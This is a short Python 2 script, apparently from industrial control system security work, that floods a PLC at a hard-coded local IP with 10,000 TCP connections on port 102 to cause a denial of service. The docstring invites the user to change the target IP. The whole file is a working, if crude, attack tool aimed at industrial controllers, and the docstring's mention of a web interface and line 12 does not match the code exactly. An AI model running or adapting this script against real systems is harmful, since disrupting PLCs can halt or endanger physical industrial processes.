"""
File: dos.py
Performs a simple TCP Denial of Service against the PLC's web interface.
Change IP on line 12 as appropriate.
"""
__author__ = 'William Jardine'

import socket, sys, os

for i in range(1, 10000):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(('192.168.0.101', 102))
	print "TCP packet sent to PLC"
	s.send("DoSing the PLC\r\n")
	s.close()
